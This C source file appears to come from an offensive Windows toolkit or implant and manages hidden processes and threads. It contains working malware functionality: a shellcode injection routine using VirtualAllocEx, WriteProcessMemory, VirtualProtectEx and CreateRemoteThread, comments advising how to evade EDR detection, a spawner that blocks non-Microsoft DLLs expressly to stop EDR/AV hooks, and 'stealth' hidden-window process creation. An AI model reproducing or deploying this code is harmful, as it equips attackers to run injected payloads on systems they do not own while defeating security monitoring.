#include "../../include/utils/thread.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// These constants may be absent from older MinGW SDK headers — define them
// manually if needed. Values match the Windows SDK (winbase.h / ntdef.h).
#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
// ProcThreadAttributeValue(ProcThreadAttributeMitigationPolicy=7, Thread=FALSE,
//                          Input=TRUE, Additive=FALSE) = 7 | 0x00020000
#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY ((DWORD_PTR)0x00020007)
#endif

#ifndef PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
// Bit 44 set: block all DLLs that are not signed by Microsoft from loading
// into the child process.
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON \
    ((DWORD64)(1ULL << 44))
#endif

//////////////////////////////////////////////////////////////
// Internal State ////////////////////////////////////////////
//////////////////////////////////////////////////////////////

static thread_entry_t thread_table[MAX_THREADS];
static BOOL table_initialized = FALSE;

static void init_table_once(void) {
  if (!table_initialized) {
    memset(thread_table, 0, sizeof(thread_table));
    table_initialized = TRUE;
  }
}

/**
 * Return the index of the first free slot, or -1 if the table is full.
 */
static int find_free_slot(void) {
  for (int i = 0; i < MAX_THREADS; i++) {
    if (!thread_table[i].active)
      return i;
  }
  return -1;
}

/**
 * Close all Win32 handles owned by an entry and zero the slot.
 * Does NOT call TerminateProcess/TerminateThread — callers are expected to
 * do that before freeing if the process is still alive.
 */
static void release_slot(thread_entry_t *entry) {
  if (entry->h_thread) {
    CloseHandle(entry->h_thread);
  }
  if (entry->h_process) {
    CloseHandle(entry->h_process);
  }
  memset(entry, 0, sizeof(thread_entry_t));
}

/**
 * Probe the actual Win32 exit code and update entry->status accordingly.
 * Suspended entries are left untouched because GetExitCodeProcess/Thread
 * returns STILL_ACTIVE for suspended objects.
 */
static void refresh_status(thread_entry_t *entry) {
  if (!entry->active)
    return;
  if (entry->status == THREAD_STATUS_TERMINATED ||
      entry->status == THREAD_STATUS_SUSPENDED ||
      entry->status == THREAD_STATUS_COMPLETED)
    return;

  DWORD exit_code = 0;
  if (entry->h_process) {
    if (GetExitCodeProcess(entry->h_process, &exit_code) &&
        exit_code != STILL_ACTIVE) {
      entry->status = THREAD_STATUS_COMPLETED;
    }
  } else {
    if (GetExitCodeThread(entry->h_thread, &exit_code) &&
        exit_code != STILL_ACTIVE) {
      entry->status = THREAD_STATUS_COMPLETED;
    }
  }
}

static const char *exec_type_str(thread_exec_t t) {
  switch (t) {
  case THREAD_EXEC_BINARY:
    return "BINARY";
  case THREAD_EXEC_COMMAND:
    return "COMMAND";
  case THREAD_EXEC_REMOTE:
    return "REMOTE";
  default:
    return "UNKNOWN";
  }
}

static const char *status_str(thread_status_t s) {
  switch (s) {
  case THREAD_STATUS_RUNNING:
    return "RUNNING";
  case THREAD_STATUS_SUSPENDED:
    return "SUSPENDED";
  case THREAD_STATUS_COMPLETED:
    return "COMPLETED";
  case THREAD_STATUS_TERMINATED:
    return "TERMINATED";
  default:
    return "UNKNOWN";
  }
}

//////////////////////////////////////////////////////////////
// Shared Process Creation Logic /////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Internal helper: call CreateProcess with stealth flags and register the
 * resulting process in the thread table.
 *
 * Flags used:
 *   CREATE_NO_WINDOW         — no console window is created or inherited
 *   CREATE_NEW_PROCESS_GROUP — child is isolated from the parent's Ctrl-C
 *                              signal group
 *   STARTF_USESHOWWINDOW / SW_HIDE — suppresses any GUI window at startup
 *
 * @param cmdline:   Fully formed command-line string (writable copy is made
 *                   internally because CreateProcessA may modify the buffer)
 * @param type:      Execution type to store in the table entry
 * @param label:     Human-readable description stored in the table
 * @param out_slot:  Receives the assigned slot index; may be NULL
 * @param attr_list: Optional PROC_THREAD_ATTRIBUTE_LIST (e.g. for mitigation
 *                   policy). Pass NULL for a plain CreateProcess call.
 *                   When non-NULL, EXTENDED_STARTUPINFO_PRESENT is added and
 *                   STARTUPINFOEXA is used instead of STARTUPINFOA.
 * @return: 0 on success, -1 on failure
 */
static int do_create_process(const char *cmdline, thread_exec_t type,
                             const char *label, DWORD *out_slot,
                             LPPROC_THREAD_ATTRIBUTE_LIST attr_list) {
  init_table_once();

  int idx = find_free_slot();
  if (idx < 0) {
    pretty_print(LOG_ERROR, "Thread table full (%d/%d entries used)",
                 MAX_THREADS, MAX_THREADS);
    return -1;
  }

  // CreateProcessA requires a writable command-line buffer
  size_t len = strlen(cmdline) + 1;
  char *cmdline_buf = (char *)malloc(len);
  if (!cmdline_buf) {
    pretty_print(LOG_ERROR, "Memory allocation failed");
    return -1;
  }
  memcpy(cmdline_buf, cmdline, len);

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  DWORD creation_flags = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP;
  LPSTARTUPINFOA psi;

  // Use the extended STARTUPINFOEX struct when an attribute list is provided.
  // Both structs begin with the same STARTUPINFOA fields, so casting is safe.
  STARTUPINFOEXA si_ex;
  STARTUPINFOA   si_plain;

  if (attr_list) {
    memset(&si_ex, 0, sizeof(si_ex));
    si_ex.StartupInfo.cb        = sizeof(si_ex);
    si_ex.StartupInfo.dwFlags   = STARTF_USESHOWWINDOW;
    si_ex.StartupInfo.wShowWindow = SW_HIDE;
    si_ex.lpAttributeList       = attr_list;
    psi = (LPSTARTUPINFOA)&si_ex;
    creation_flags |= EXTENDED_STARTUPINFO_PRESENT;
  } else {
    memset(&si_plain, 0, sizeof(si_plain));
    si_plain.cb          = sizeof(si_plain);
    si_plain.dwFlags     = STARTF_USESHOWWINDOW;
    si_plain.wShowWindow = SW_HIDE;
    psi = &si_plain;
  }

  BOOL ok = CreateProcessA(
      NULL,           // Derive executable from cmdline (first token)
      cmdline_buf,    // Writable command line
      NULL,           // Default process security attributes
      NULL,           // Default thread security attributes
      FALSE,          // Do not inherit parent's handles
      creation_flags,
      NULL,           // Inherit parent's environment block
      NULL,           // Inherit parent's working directory
      psi,            // Startup configuration (plain or extended)
      &pi             // Out: process and thread handles + IDs
  );

  free(cmdline_buf);

  if (!ok) {
    pretty_print(LOG_ERROR, "CreateProcess failed: %lu", GetLastError());
    return -1;
  }

  thread_entry_t *entry = &thread_table[idx];
  entry->active    = TRUE;
  entry->slot      = (DWORD)idx;
  entry->thread_id = pi.dwThreadId;
  entry->h_thread  = pi.hThread;
  entry->h_process = pi.hProcess;
  entry->exec_type = type;
  entry->status    = THREAD_STATUS_RUNNING;
  strncpy(entry->label, label, THREAD_LABEL_SIZE - 1);
  entry->label[THREAD_LABEL_SIZE - 1] = '\0';

  if (out_slot)
    *out_slot = (DWORD)idx;

  pretty_print(LOG_SUCCESS,
               "[slot %d] Process started — PID %lu | TID %lu | %s",
               idx, pi.dwProcessId, pi.dwThreadId, label);
  return 0;
}

//////////////////////////////////////////////////////////////
// Process Spawning //////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Spawn a binary in a new hidden process and track it.
 * The binary path is quoted to handle spaces; args are appended verbatim.
 */
int spawn_binary(const char *binaryPath, const char *args, DWORD *slot) {
  if (!binaryPath) {
    pretty_print(LOG_ERROR, "Invalid parameters");
    return -1;
  }

  // 32 767 is the maximum command-line length on Windows
  char cmdline[32767];
  if (args && *args) {
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", binaryPath, args);
  } else {
    snprintf(cmdline, sizeof(cmdline), "\"%s\"", binaryPath);
  }

  char label[THREAD_LABEL_SIZE];
  snprintf(label, sizeof(label), "%s%s%s", binaryPath,
           (args && *args) ? " " : "", (args && *args) ? args : "");

  return do_create_process(cmdline, THREAD_EXEC_BINARY, label, slot, NULL);
}

/**
 * Execute a shell command via cmd.exe /c in a hidden process and track it.
 * COMSPEC is used so the correct interpreter is resolved even when cmd.exe is
 * not on PATH (e.g., in stripped environments). Falls back to "cmd.exe" if
 * COMSPEC is unset.
 */
int spawn_command(const char *command, DWORD *slot) {
  if (!command) {
    pretty_print(LOG_ERROR, "Invalid parameters");
    return -1;
  }

  const char *comspec = getenv("COMSPEC");
  if (!comspec || !*comspec) {
    comspec = "cmd.exe";
  }

  char cmdline[32767];
  snprintf(cmdline, sizeof(cmdline), "\"%s\" /c %s", comspec, command);

  return do_create_process(cmdline, THREAD_EXEC_COMMAND, command, slot, NULL);
}

/**
 * Spawn a binary with a process mitigation policy that blocks non-Microsoft-
 * signed DLLs from loading into the child process.
 *
 * This prevents EDR/AV products from injecting their user-mode hooks via
 * AppInit_DLLs, SetWindowsHookEx, the shim engine, or any other DLL-injection
 * vector, because the kernel will refuse to map unsigned or third-party-signed
 * images into the process.
 *
 * Implementation:
 *   1. Allocate a PROC_THREAD_ATTRIBUTE_LIST with one slot.
 *   2. Store PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.
 *   3. Call do_create_process with the attribute list → EXTENDED_STARTUPINFO_PRESENT.
 *   4. Free the attribute list (safe after CreateProcess returns).
 *
 * The policy is enforced by the kernel on the *child* only. If the binary or
 * any of its import-table DLLs is not Microsoft-signed, the process will fail
 * to start with ERROR_ACCESS_DENIED. Test with a known-good signed binary
 * (e.g. notepad.exe) before using on a custom payload.
 */
int spawn_binary_hardened(const char *binaryPath, const char *args, DWORD *slot) {
  if (!binaryPath) {
    pretty_print(LOG_ERROR, "spawn_binary_hardened: invalid parameters");
    return -1;
  }

  // ── 1. Allocate the attribute list ──────────────────────────────────────
  SIZE_T attr_size = 0;
  InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);

  LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
      (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_size);
  if (!attr_list) {
    pretty_print(LOG_ERROR, "spawn_binary_hardened: malloc failed");
    return -1;
  }

  if (!InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size)) {
    pretty_print(LOG_ERROR,
                 "spawn_binary_hardened: InitializeProcThreadAttributeList "
                 "failed: %lu", GetLastError());
    free(attr_list);
    return -1;
  }

  // ── 2. Set the mitigation policy attribute ───────────────────────────────
  DWORD64 policy =
      PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

  if (!UpdateProcThreadAttribute(
          attr_list,
          0,
          PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
          &policy,
          sizeof(policy),
          NULL,
          NULL)) {
    pretty_print(LOG_ERROR,
                 "spawn_binary_hardened: UpdateProcThreadAttribute failed: %lu",
                 GetLastError());
    DeleteProcThreadAttributeList(attr_list);
    free(attr_list);
    return -1;
  }

  // ── 3. Build command line and spawn ──────────────────────────────────────
  char cmdline[32767];
  if (args && *args) {
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", binaryPath, args);
  } else {
    snprintf(cmdline, sizeof(cmdline), "\"%s\"", binaryPath);
  }

  char label[THREAD_LABEL_SIZE];
  snprintf(label, sizeof(label), "[hardened] %s%s%s", binaryPath,
           (args && *args) ? " " : "", (args && *args) ? args : "");

  int rc = do_create_process(cmdline, THREAD_EXEC_BINARY, label, slot,
                             attr_list);

  // ── 4. Clean up attribute list (safe after CreateProcess returns) ─────────
  DeleteProcThreadAttributeList(attr_list);
  free(attr_list);

  return rc;
}

//////////////////////////////////////////////////////////////
// Shellcode Injection ///////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Inject shellcode into a running process via the classic RWX-inject technique.
 *
 * Step-by-step:
 *   1. OpenProcess — acquire VM + thread-creation rights on the target
 *   2. VirtualAllocEx — reserve a PAGE_EXECUTE_READWRITE region in the target
 *   3. WriteProcessMemory — copy shellcode bytes into that region
 *   4. CreateRemoteThread — start execution at the shellcode entry point
 *
 * The remote allocation is PAGE_EXECUTE_READWRITE to avoid a VirtualProtectEx
 * round-trip. This is the loudest possible allocation type from a detection
 * standpoint. For evasion:
 *   - Allocate PAGE_READWRITE, write, then flip to PAGE_EXECUTE_READ with
 *     VirtualProtectEx before CreateRemoteThread.
 *   - Consider targeting an existing RX section via a reflective loader
 *     instead of a fresh allocation.
 *
 * The h_process handle is retained in the table for status queries and
 * termination. It is closed by thread_cleanup() or thread_kill().
 */
int inject_shellcode(DWORD targetPid, const BYTE *shellcode,
                     SIZE_T shellcodeSize, DWORD *slot) {
  if (!shellcode || shellcodeSize == 0) {
    pretty_print(LOG_ERROR, "Invalid parameters");
    return -1;
  }

  init_table_once();

  int idx = find_free_slot();
  if (idx < 0) {
    pretty_print(LOG_ERROR, "Thread table full (%d/%d entries used)",
                 MAX_THREADS, MAX_THREADS);
    return -1;
  }

  // --- 1. Open the target process ---
  HANDLE hProcess = OpenProcess(
      PROCESS_VM_OPERATION |    // VirtualAllocEx / VirtualProtectEx
          PROCESS_VM_WRITE |    // WriteProcessMemory
          PROCESS_VM_READ |     // ReadProcessMemory (diagnostics / verification)
          PROCESS_CREATE_THREAD | // CreateRemoteThread
          PROCESS_QUERY_INFORMATION, // GetExitCodeProcess
      FALSE,    // Do not inherit handle into child processes
      targetPid //
  );
  if (!hProcess) {
    pretty_print(LOG_ERROR, "OpenProcess(PID %lu) failed: %lu", targetPid,
                 GetLastError());
    return -1;
  }

  // --- 2. Allocate RW (non-executable) memory in the target's address space ---
  // Allocate PAGE_READWRITE first. Writing to an RWX region is a strong EDR
  // signal; separating the write and execute permissions is considerably
  // quieter because the allocation never appears RWX in the process VAD.
  LPVOID remote_addr = VirtualAllocEx(
      hProcess,
      NULL,                     // Let the OS pick the base address
      shellcodeSize,
      MEM_COMMIT | MEM_RESERVE, // Commit pages immediately
      PAGE_READWRITE            // RW only — flip to RX before execution
  );
  if (!remote_addr) {
    pretty_print(LOG_ERROR, "VirtualAllocEx failed: %lu", GetLastError());
    CloseHandle(hProcess);
    return -1;
  }

  // --- 3. Copy shellcode into the remote allocation ---
  SIZE_T written = 0;
  if (!WriteProcessMemory(hProcess, remote_addr, shellcode, shellcodeSize,
                          &written) ||
      written != shellcodeSize) {
    pretty_print(LOG_ERROR,
                 "WriteProcessMemory incomplete (%zu/%zu bytes written): %lu",
                 written, shellcodeSize, GetLastError());
    VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return -1;
  }

  // --- 3b. Flip protection to RX — no write access after copy ---
  // PAGE_EXECUTE_READ is the minimum needed for execution. Keeping the region
  // writable after WriteProcessMemory has no benefit and is flagged by many
  // EDR products as an IOC.
  DWORD old_protect = 0;
  if (!VirtualProtectEx(hProcess, remote_addr, shellcodeSize,
                        PAGE_EXECUTE_READ, &old_protect)) {
    pretty_print(LOG_ERROR, "VirtualProtectEx(RX) failed: %lu", GetLastError());
    VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return -1;
  }

  // --- 4. Start execution at shellcode entry point ---
  DWORD remote_tid = 0;
  HANDLE hThread = CreateRemoteThread(
      hProcess,                               // Target process
      NULL,                                   // Default security descriptor
      0,                                      // Default stack size
      (LPTHREAD_START_ROUTINE)remote_addr,    // Entry point = shellcode start
      NULL,                                   // No argument passed to shellcode
      0,                                      // Start immediately (not suspended)
      &remote_tid                             // Receives the remote thread ID
  );
  if (!hThread) {
    pretty_print(LOG_ERROR, "CreateRemoteThread failed: %lu", GetLastError());
    VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return -1;
  }

  thread_entry_t *entry = &thread_table[idx];
  entry->active    = TRUE;
  entry->slot      = (DWORD)idx;
  entry->thread_id = remote_tid;
  entry->h_thread  = hThread;
  entry->h_process = hProcess; // Retained for status queries and termination
  entry->exec_type = THREAD_EXEC_REMOTE;
  entry->status    = THREAD_STATUS_RUNNING;
  snprintf(entry->label, THREAD_LABEL_SIZE,
           "pid:%lu @ %p (%zu bytes)", targetPid, remote_addr, shellcodeSize);

  if (slot)
    *slot = (DWORD)idx;

  pretty_print(LOG_SUCCESS,
               "[slot %d] Shellcode injected — target PID %lu | remote TID "
               "%lu | entry @ %p | %zu bytes written",
               idx, targetPid, remote_tid, remote_addr, shellcodeSize);
  return 0;
}

//////////////////////////////////////////////////////////////
// Thread Lifecycle //////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Suspend a tracked thread.
 * For process-backed entries (BINARY, COMMAND) this suspends only the process's
 * main thread. Other threads in the same process continue executing. Use
 * NtSuspendProcess (ntdll, undocumented) to freeze all threads atomically.
 */
int thread_suspend(DWORD slot) {
  if (slot >= MAX_THREADS || !thread_table[slot].active) {
    pretty_print(LOG_ERROR, "Invalid slot %lu", slot);
    return -1;
  }

  thread_entry_t *entry = &thread_table[slot];

  if (SuspendThread(entry->h_thread) == (DWORD)-1) {
    pretty_print(LOG_ERROR, "[slot %lu] SuspendThread failed: %lu", slot,
                 GetLastError());
    return -1;
  }

  entry->status = THREAD_STATUS_SUSPENDED;
  pretty_print(LOG_SUCCESS, "[slot %lu] TID %lu suspended", slot,
               entry->thread_id);
  return 0;
}

/**
 * Resume a suspended tracked thread.
 * ResumeThread decrements the suspend count; the thread resumes only when the
 * count reaches zero (multiple suspends require multiple resumes).
 */
int thread_resume(DWORD slot) {
  if (slot >= MAX_THREADS || !thread_table[slot].active) {
    pretty_print(LOG_ERROR, "Invalid slot %lu", slot);
    return -1;
  }

  thread_entry_t *entry = &thread_table[slot];

  DWORD prev = ResumeThread(entry->h_thread);
  if (prev == (DWORD)-1) {
    pretty_print(LOG_ERROR, "[slot %lu] ResumeThread failed: %lu", slot,
                 GetLastError());
    return -1;
  }

  // prev is the suspend count before this call; 1 means the thread is now
  // running, >1 means it is still suspended and needs more resumes.
  if (prev > 1) {
    pretty_print(LOG_WARNING,
                 "[slot %lu] TID %lu still suspended (count was %lu, "
                 "needs %lu more resume call(s))",
                 slot, entry->thread_id, prev, prev - 1);
  } else {
    entry->status = THREAD_STATUS_RUNNING;
    pretty_print(LOG_SUCCESS, "[slot %lu] TID %lu resumed", slot,
                 entry->thread_id);
  }
  return 0;
}

/**
 * Terminate a tracked thread or its associated process.
 *
 * BINARY / COMMAND entries:
 *   TerminateProcess kills all threads in the process atomically and frees
 *   its address space. Exit code 1 is passed as the process exit code.
 *
 * REMOTE entries:
 *   TerminateThread is used. This is unsafe by design — the target process
 *   may hold kernel objects, heap locks, or loader locks that will never be
 *   released, potentially deadlocking other threads. If taking down the
 *   entire target process is acceptable, use TerminateProcess on h_process
 *   instead and extend this function accordingly.
 */
int thread_kill(DWORD slot) {
  if (slot >= MAX_THREADS || !thread_table[slot].active) {
    pretty_print(LOG_ERROR, "Invalid slot %lu", slot);
    return -1;
  }

  thread_entry_t *entry = &thread_table[slot];
  BOOL ok;

  if (entry->exec_type == THREAD_EXEC_BINARY ||
      entry->exec_type == THREAD_EXEC_COMMAND) {
    ok = TerminateProcess(entry->h_process, // Kill the whole process
                          1                 // Exit code reported to the OS
    );
    if (!ok) {
      pretty_print(LOG_ERROR, "[slot %lu] TerminateProcess failed: %lu", slot,
                   GetLastError());
      return -1;
    }
  } else {
    // THREAD_EXEC_REMOTE — only terminate the injected thread
    ok = TerminateThread(entry->h_thread, // Remote thread handle
                         1               // Exit code for the thread
    );
    if (!ok) {
      pretty_print(LOG_ERROR, "[slot %lu] TerminateThread failed: %lu", slot,
                   GetLastError());
      return -1;
    }
  }

  entry->status = THREAD_STATUS_TERMINATED;
  pretty_print(LOG_SUCCESS, "[slot %lu] Terminated (%s)", slot,
               exec_type_str(entry->exec_type));
  return 0;
}

/**
 * Block until a tracked thread or process exits, or until the timeout elapses.
 * Waits on h_process when available (signals on process exit, which is a
 * superset of thread exit for single-threaded processes), otherwise on
 * h_thread.
 *
 * @return: 0 = signaled (exited), 1 = timeout, -1 = error
 */
int thread_wait(DWORD slot, DWORD timeoutMs) {
  if (slot >= MAX_THREADS || !thread_table[slot].active) {
    pretty_print(LOG_ERROR, "Invalid slot %lu", slot);
    return -1;
  }

  thread_entry_t *entry = &thread_table[slot];
  HANDLE wait_target =
      entry->h_process ? entry->h_process : entry->h_thread;

  DWORD result = WaitForSingleObject(wait_target, timeoutMs);

  switch (result) {
  case WAIT_OBJECT_0:
    entry->status = THREAD_STATUS_COMPLETED;
    pretty_print(LOG_SUCCESS, "[slot %lu] Exited normally", slot);
    return 0;
  case WAIT_TIMEOUT:
    pretty_print(LOG_WARNING, "[slot %lu] Wait timed out after %lu ms", slot,
                 timeoutMs);
    return 1;
  default:
    pretty_print(LOG_ERROR,
                 "[slot %lu] WaitForSingleObject failed: %lu", slot,
                 GetLastError());
    return -1;
  }
}

/**
 * Print a formatted table of all active entries.
 * Each entry's status is refreshed before printing.
 */
void thread_list(void) {
  init_table_once();

  pretty_print(LOG_INFO, "Thread table (%d max slots):", MAX_THREADS);
  printf("  %-5s  %-10s  %-9s  %-12s  %s\n", "SLOT", "TID", "TYPE", "STATUS",
         "LABEL");
  printf("  %-5s  %-10s  %-9s  %-12s  %s\n", "----", "---", "----", "------",
         "-----");

  int count = 0;
  for (int i = 0; i < MAX_THREADS; i++) {
    thread_entry_t *e = &thread_table[i];
    if (!e->active)
      continue;
    refresh_status(e);
    printf("  %-5lu  %-10lu  %-9s  %-12s  %s\n", e->slot, e->thread_id,
           exec_type_str(e->exec_type), status_str(e->status), e->label);
    count++;
  }

  if (count == 0)
    pretty_print(LOG_INFO, "(no active entries)");
}

/**
 * Close handles and free slots for all COMPLETED and TERMINATED entries.
 * RUNNING and SUSPENDED entries are left untouched.
 */
void thread_cleanup(void) {
  init_table_once();

  int freed = 0;
  for (int i = 0; i < MAX_THREADS; i++) {
    thread_entry_t *e = &thread_table[i];
    if (!e->active)
      continue;
    refresh_status(e);
    if (e->status == THREAD_STATUS_COMPLETED ||
        e->status == THREAD_STATUS_TERMINATED) {
      release_slot(e);
      freed++;
    }
  }

  pretty_print(LOG_SUCCESS, "Cleanup complete — freed %d slot(s)", freed);
}

/**
 * Register an externally-created (hProcess, hThread) pair into the table.
 * Allows callers that use their own CreateProcess* variant (e.g. token.c's
 * spawn_as_token) to hand off handle ownership to the tracking table.
 */
int thread_register(HANDLE hProcess, HANDLE hThread, DWORD pid, DWORD tid,
                    thread_exec_t exec_type, const char *label, DWORD *out_slot) {
  if (!hThread) {
    pretty_print(LOG_ERROR, "thread_register: hThread is required");
    return -1;
  }

  init_table_once();

  int idx = find_free_slot();
  if (idx < 0) {
    pretty_print(LOG_ERROR, "thread_register: table full (%d/%d entries used)",
                 MAX_THREADS, MAX_THREADS);
    return -1;
  }

  thread_entry_t *entry = &thread_table[idx];
  entry->active    = TRUE;
  entry->slot      = (DWORD)idx;
  entry->thread_id = tid;
  entry->h_thread  = hThread;
  entry->h_process = hProcess;
  entry->exec_type = exec_type;
  entry->status    = THREAD_STATUS_RUNNING;
  strncpy(entry->label, label ? label : "", THREAD_LABEL_SIZE - 1);
  entry->label[THREAD_LABEL_SIZE - 1] = '\0';

  if (out_slot)
    *out_slot = (DWORD)idx;

  pretty_print(LOG_SUCCESS,
               "[slot %d] Registered external process — PID %lu | TID %lu | %s",
               idx, pid, tid, entry->label);
  return 0;
}
